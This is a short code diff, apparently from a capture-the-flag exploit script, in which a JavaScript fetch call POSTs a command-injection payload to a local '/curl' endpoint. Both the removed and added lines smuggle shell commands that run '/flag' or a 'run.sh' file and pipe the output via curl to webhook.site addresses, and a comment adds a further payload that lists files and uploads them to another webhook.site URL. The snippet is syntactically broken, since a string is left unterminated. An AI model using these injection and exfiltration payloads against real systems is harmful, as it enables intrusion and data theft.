@@ -13,7 +13,7 @@
         const res = await fetch("http://localhost:8001/curl", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "cmd=; exec /flag | curl -X POST -d @- https://webhook.site/e228f56e-625b-4536-89a0-dad902f5e61a/q= | curl -d @/proc/self/fd/0 https://webhook.site/e228f56e-625b-4536-89a0-dad902f5e61a/p=`/flag`
+            body: "cmd=file:///run.sh | curl -X POST -d @- https://webhook.site/e228f56e-625b-4536-89a0-dad902f5e61a/q= | curl -d @/proc/self/fd/0 https://webhook.site/e228f56e-625b-4536-89a0-dad902f5e61a/p=`/flag`
              // replace with the command you want//; ls>ls.txt; curl -X POST --data-binary @ls.txt https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2
         });
         const data = await res.text();
